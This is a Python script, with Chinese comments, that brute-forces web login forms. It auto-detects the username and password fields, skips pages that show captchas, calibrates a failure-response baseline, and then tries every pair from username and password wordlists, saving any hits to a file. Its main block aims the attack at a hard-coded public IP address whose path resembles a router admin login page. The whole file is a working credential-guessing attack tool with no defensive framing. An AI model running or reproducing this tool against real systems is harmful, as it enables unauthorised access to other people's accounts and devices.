import difflib
import re
import traceback

import requests

from utils import print_inf, fixrespo, print_err, print_suc

pac = 0
debug = False
output = open('brute_output_suc.res', 'w+')
output_err = open('brute_output_err.res', 'w+')
bf_res = ''
bf_err_res = ''


def str_sim(s1, s2):
    return difflib.SequenceMatcher(None, s1, s2).quick_ratio()  # 计算文本相似度


def fix_url(url, prefix='http'):
    if 'http' not in url:
        url = '%s://%s' % (prefix, url)
    if url[-1] == '/':
        url[-1] = ''
    return url


def ckhavevfcd(resp):
    for it in open('judg/verifycode.list', 'r', encoding='utf-8').readlines():
        if it in resp:
            return True
    return False


def getrawurl(url: str):
    prefix = ''
    if 'http://' in url:
        prefix = 'http://'
    elif 'https://' in url:
        prefix = 'https://'
    else:
        prefix = 'http://'
    url = url.replace('https://', '')
    url = url.replace('http://', '')
    if '/' in url:
        url = url.split('/')[0]
    return '%s%s' % (prefix, url)


def sendform(una, pwd, url, agr='http', used=False):
    global pac
    try:
        res = requests.get(fix_url(url, agr), timeout=3).text
        res = fixrespo(res)  # 修复包
        # print(res)
        pac += 1
        if ckhavevfcd(res):
            print_err('%s存在验证码' % url)
            return None
        for it in re.findall('<(.*?)>', res):
            if 'form' in it and 'method="' in it and 'action="' in it:

                method = re.findall('method="(.*?)"', it)[0]
                action = re.findall('action="(.*?)"', it)[0]
                if debug:
                    print_err(res)
                    print_err(method)
                    print_err(action)
                form_body = re.findall('<form(.*?)</form', res)[0]
                pwd_form_nam = ''
                una_form_nam = ''
                for it in re.findall('name="(.*?)"', form_body):
                    if str_sim('username', it) > str_sim('password', it):
                        una_form_nam = it
                    else:
                        pwd_form_nam = it
                data = {
                    una_form_nam: una,
                    pwd_form_nam: pwd
                }  # 构造表单数据
                rawurl = getrawurl(url)
                if debug:
                    print_err("%s -> %s" % (data, '%s/%s' % (rawurl, action)))
                if 'post' in method:
                    return requests.post('%s/%s' % (rawurl, action), data=data).text
                if 'get' in method:
                    return requests.get('%s/%s' % (rawurl, action), data=data).text
    except:
        if debug:
            traceback.print_exc()
        if used:
            traceback.print_exc()
            return None  # 防锁
        return sendform(una, pwd, url, 'https', True)  # 切协议


def getp_errjgrate(url: str):
    inc_pwd = '8WADsg1o'  # 八位
    c_uname = 'admin'
    n = 6
    ave_incor = 0.0
    max_minus = 0.0
    r = []
    try:
        for i in range(0, n):
            r.append(fixrespo(sendform(una=c_uname, pwd=inc_pwd, url=url)))
        max = 0.0
        min = 1.0
        for it in r:
            sim = str_sim(r[0], fixrespo(it))
            if sim > max:
                max = str_sim(r[0], fixrespo(it))
            elif sim < min:
                min = str_sim(r[0], fixrespo(it))
            ave_incor += sim
            # print(str_sim(r[0], fixrespo(it)))
        max_minus = max - min
        ave_incor = ave_incor / n  # 计算平均错误率
        return {
            'pg': r[0],
            'rate': ave_incor - (3 * max_minus)
        }
    except:
        traceback.print_exc()
        return None


def bf(url):
    global bf_res, bf_err_res
    try:
        url = fix_url(url)
        print_inf('开始爆破%s' % url)
        inc_resp = getp_errjgrate(url)
        print_inf('找到爆破点')
        # threads = []
        for una in open('una.list', 'r').readlines():
            for pwd in open('pwd.list', 'r').readlines():
                una = fixrespo(una)
                pwd = fixrespo(pwd)
                r = sendform(una=una, pwd=pwd, url=url)
                if str_sim(fixrespo(r), fixrespo(inc_resp['pg'])) < inc_resp['rate']:
                    if debug:
                        print(fixrespo(inc_resp['pg']))
                        print(fixrespo(r))
                    if len(r) > 16:
                        print_suc('爆破成功 %s:%s' % (una, pwd))
                        bf_res += '%s:%s\n' % (una, pwd)
                        output.write(bf_res)

                    return {una: una, pwd: pwd}
                else:
                    print_err('%s:%s' % (una, pwd))
    except:
        print_err('%s没有找到爆破点' % fix_url(url))
        bf_err_res += '%s\n' % fix_url(url)


if __name__ == '__main__':
    print(bf('http://210.209.142.103:8080/Main_Login.asp'))
